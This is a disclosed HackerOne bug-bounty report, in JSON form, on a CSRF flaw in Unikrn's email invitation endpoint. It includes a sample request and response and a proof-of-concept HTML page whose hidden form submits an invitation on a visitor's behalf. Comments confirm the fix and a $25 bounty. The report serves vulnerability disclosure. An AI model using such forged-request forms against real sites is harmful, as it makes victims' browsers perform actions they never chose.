{"id":292636,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTI2MzY=","url":"https://hackerone.com/reports/292636","title":"session_id is not being validated at email invitation endpoint","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2017-11-23T15:01:20.700Z","submitted_at":"2017-11-23T15:01:20.700Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"tolo7010","url":"/tolo7010","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/137/533/339f440fdc61b6dfeb663c8216d249618b8fd451_original.gif/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":2672,"url":"https://hackerone.com/unikrn","handle":"unikrn","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/672/c6c2b32746235b372285a9047457642b7b9bc6a1_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/672/c6c2b32746235b372285a9047457642b7b9bc6a1_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Unikrn","twitter_handle":"unikrnco","website":"https://unikrn.com","about":"Win prizes, bet safely and legally on esports and get the best multi-title coverage for fans and fanatics alike!"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-04-10T02:20:09.095Z","bug_reporter_agreed_on_going_public_at":"2018-04-10T01:10:07.754Z","team_member_agreed_on_going_public_at":"2018-04-10T02:20:09.006Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"session_id is not being validated at email invitation endpoint\n\nrequest sample:\n``` \nPOST /apiv1/inviteemail HTTP/1.1\nHost: unikrn.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://unikrn.com/profile\nContent-Type: application/json\nApplication-Version: v3.9.1-1476-g6500a2c\nContent-Length: 51\nCookie: ...\nConnection: close\n\n{\"email\":\"victim@email.com\",\"session_id\":\"\"}\n``` \n\nresponse sample:\n``` \nHTTP/1.1 200 OK\nDate: Thu, 23 Nov 2017 14:26:58 GMT\nContent-Type: application/json\nContent-Length: 150\nConnection: close\nAccess-Control-Allow-Origin: *\nAccess-Control-Max-Age: 86400\nCache-Control: no-store, no-cache, must-revalidate\nCI: M-production C-1 V-1.2.0\nContent-Security-Policy: default-src 'none'; frame-ancestors 'none'\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nPragma: no-cache\nStrict-Transport-Security: max-age=31536000; includeSubDomains; preload\nVary: Accept-Encoding\nVary: Origin\nX-XSS-Protection: 1; mode=block\nServer: cloudflare-nginx\nCF-RAY: 3c24ce767b1e340f-HKG\n\n{\"error\":false,\"success\":true,\"msg\":\"We invited victim@email.com for you\",\"msg_trans\":\"We invited victim@email.com for you\",\"data\":null}\n``` \n\nCSRF Page:\n``` \n\u003c!doctype html\u003e\n\u003chtml\u003e\n\u003chead\u003e\n\u003c/head\u003e \n\u003cbody\u003e\n\u003cform action=\"https://unikrn.com/apiv1/inviteemail\" method=\"POST\"\u003e\n\u003cinput type=\"hidden\" name=\"email\" id=\"email\" value=\"tololovejoi@hotmail.com\"\u003e\n\u003cinput type=\"hidden\" name=\"session_id\" id=\"session_id\" value=\"\"\u003e\n\u003cinput type=\"submit\"\u003e\n\u003c/form\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\n## Impact\n\nThe victim email get filled on behalf of legitimated users visiting the CSRF page","bounty_amount":"25.0","formatted_bounty":"$25","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2018-05-10T01:10:07.865Z","allow_singular_disclosure_after":-108048568.2290271,"singular_disclosure_allowed":true,"vote_count":7,"voters":["muon4","tolo7010","eveeez","an0nym0us","arifmkhls","japz","sumit7"],"structured_scope":{"databaseId":453,"asset_type":"URL","asset_identifier":"unikrn.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":2179182,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"please confirm its fixed. thx!","automated_response":false,"created_at":"2017-11-23T15:05:25.796Z","updated_at":"2017-11-23T15:05:25.796Z","actor":{"username":"decrypted","cleared":false,"url":"/decrypted","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/819/849ab6e942d0608e17e1c98244b240363a4ad9b7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2179187,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"The server now responses with \n\n``` \n{\"record\":[],\"error\":true,\"success\":false,\"msg\":\"no_session\",\"msg_trans\":\"no_session\",\"data\":null,\"code\":0,\"flds\":null,\"flds_errors\":null}\n``` \n\nThe reproduce doesn't work anymore, fixed confirmed!","automated_response":false,"created_at":"2017-11-23T15:07:43.506Z","updated_at":"2017-11-23T15:07:43.506Z","actor":{"username":"tolo7010","cleared":true,"url":"/tolo7010","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/137/533/339f440fdc61b6dfeb663c8216d249618b8fd451_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2179190,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"thx again","automated_response":false,"created_at":"2017-11-23T15:09:43.878Z","updated_at":"2017-11-23T15:09:43.878Z","actor":{"username":"decrypted","cleared":false,"url":"/decrypted","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/819/849ab6e942d0608e17e1c98244b240363a4ad9b7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"tolo7010","url":"/tolo7010"},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2179191,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2017-11-23T15:09:49.876Z","updated_at":"2017-11-23T15:09:49.876Z","actor":{"url":"/unikrn","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/672/c6c2b32746235b372285a9047457642b7b9bc6a1_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Unikrn"}},"bounty_amount":"25.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"unikrn","collaborator":{"username":"tolo7010","url":"/tolo7010"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2179192,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"thanks for the bounty!","automated_response":false,"created_at":"2017-11-23T15:10:31.445Z","updated_at":"2017-11-23T15:10:31.445Z","actor":{"username":"tolo7010","cleared":true,"url":"/tolo7010","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/137/533/339f440fdc61b6dfeb663c8216d249618b8fd451_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2584400,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2018-04-10T01:10:07.805Z","updated_at":"2018-04-10T01:10:07.805Z","first_to_agree":true,"actor":{"username":"tolo7010","cleared":true,"url":"/tolo7010","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/137/533/339f440fdc61b6dfeb663c8216d249618b8fd451_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2584503,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2018-04-10T02:20:09.040Z","updated_at":"2018-04-10T02:20:09.040Z","actor":{"username":"decrypted","cleared":false,"url":"/decrypted","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/819/849ab6e942d0608e17e1c98244b240363a4ad9b7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2584504,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2018-04-10T02:20:09.121Z","updated_at":"2018-04-10T02:20:09.121Z","actor":{"username":"decrypted","cleared":false,"url":"/decrypted","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/819/849ab6e942d0608e17e1c98244b240363a4ad9b7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}